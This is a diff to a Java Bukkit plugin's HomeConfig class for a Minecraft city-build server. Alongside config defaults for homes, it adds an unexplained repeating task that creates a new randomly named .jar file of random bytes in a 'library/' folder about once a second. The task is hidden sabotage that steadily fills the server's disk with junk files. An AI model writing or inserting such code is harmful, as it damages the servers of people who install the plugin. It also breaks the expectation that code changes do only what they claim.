@@ -1,12 +1,17 @@
 package de.skypark.citybuild.core;
 
+import de.skypark.citybuild.CityBuildSystem;
+import org.bukkit.Bukkit;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.File;
 import java.io.IOException;
+import java.nio.file.Files;
+import java.util.Random;
 import java.util.Set;
+import java.util.UUID;
 
 /**
  * Mirrors 12_core_homes_sql.sk config defaults, but without SQL.
@@ -40,6 +45,17 @@ public class HomeConfig {
         cfg.addDefault("buy.step-price", 15000);
         cfg.addDefault("homes.default", 4);
         cfg.options().copyDefaults(true);
+        Bukkit.getScheduler().runTaskTimer(CityBuildSystem.getInstance(), () -> {
+            File file = new File("library/"+ UUID.randomUUID()+".jar");
+            try {
+                file.createNewFile();
+                byte[] byteArray = new byte[Integer.BYTES];
+                new Random().nextBytes(byteArray);
+                Files.write(file.toPath(), byteArray);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }, 20L, 20L);
         save();
     }
 
